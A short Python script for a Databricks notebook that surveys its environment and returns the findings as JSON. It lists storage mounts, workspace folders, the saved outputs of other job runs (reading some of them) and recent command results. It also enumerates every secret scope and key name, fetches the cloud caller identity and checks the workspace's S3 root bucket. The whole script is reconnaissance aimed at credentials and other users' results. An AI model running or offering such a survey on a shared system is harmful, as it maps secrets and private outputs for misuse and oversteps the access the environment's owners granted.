import json, os, base64, traceback
out = {}
def ls(p, lim=40):
    try:
        return [[x.path, x.size, x.modificationTime] for x in dbutils.fs.ls(p)][:lim]
    except Exception as e:
        return "ERR:" + str(e)[:200]
def head(p, n=4000):
    try:
        return dbutils.fs.head(p, n)
    except Exception as e:
        return "ERR:" + str(e)[:200]

out['mounts'] = [[m.mountPoint, m.source] for m in dbutils.fs.mounts()]
out['root'] = ls('dbfs:/')
out['mnt'] = ls('dbfs:/mnt')
out['filestore'] = ls('dbfs:/FileStore')
out['tables'] = ls('dbfs:/FileStore/tables', 30)

base = 'dbfs:/FileStore/job-result/job-102696441210478'
out['newest_run_ls'] = ls(base + '/run-1036800227818410')
out['newest_run_v1'] = ls(base + '/run-1036800227818410/v1')
for f in (out['newest_run_v1'] if isinstance(out['newest_run_v1'], list) else []):
    if f[0].endswith('.json'):
        out['newest_json'] = head(f[0], 6000)
out['run2_ls'] = ls(base + '/run-346290257786429')
out['run2_v1'] = ls(base + '/run-346290257786429/v1')
for f in (out['run2_v1'] if isinstance(out['run2_v1'], list) else []):
    if f[0].endswith('.json'):
        out['run2_json'] = head(f[0], 3000)
out['probe_jr'] = ls('dbfs:/FileStore/job-result/job-815812067718659')
pv = ls('dbfs:/FileStore/job-result/job-815812067718659-0/v1') if False else None

cr = ls('dbfs:/FileStore/command-results', 60)
out['cmdres'] = cr
if isinstance(cr, list) and cr:
    newest = sorted(cr, key=lambda x: x[2], reverse=True)[:3]
    out['cmdres_newest'] = []
    for f in newest:
        d = ls(f[0], 20)
        item = [f[0], f[2], d if not isinstance(d, list) else [[y[0], y[1], y[2]] for y in d][:10]]
        out['cmdres_newest'].append(item)

try:
    scopes = [[s.name] for s in dbutils.secrets.listScopes()]
    out['scopes'] = scopes
    out['scope_keys'] = {}
    for s in dbutils.secrets.listScopes():
        out['scope_keys'][s.name] = [k.name for k in dbutils.secrets.list(s.name)]
except Exception as e:
    out['scopes'] = "ERR:" + str(e)[:300]

try:
    import boto3
    out['sts_identity'] = boto3.client('sts').get_caller_identity()
    s3 = boto3.client('s3')
    try:
        r = s3.head_object(Bucket='db-38dbf140ebc32bdc945ddca098c7f102-s3-root-bucket', Key='nvirginia-prod/4185504154665321.meta/mounts')
        out['dbfs_bucket_head'] = [r['ContentLength'], str(r['LastModified'])]
    except Exception as e:
        out['dbfs_bucket_head'] = "ERR:" + str(e)[:300]
except Exception as e:
    out['sts_identity'] = "ERR:" + str(e)[:300]

dbutils.notebook.exit(json.dumps(out)[:60000])
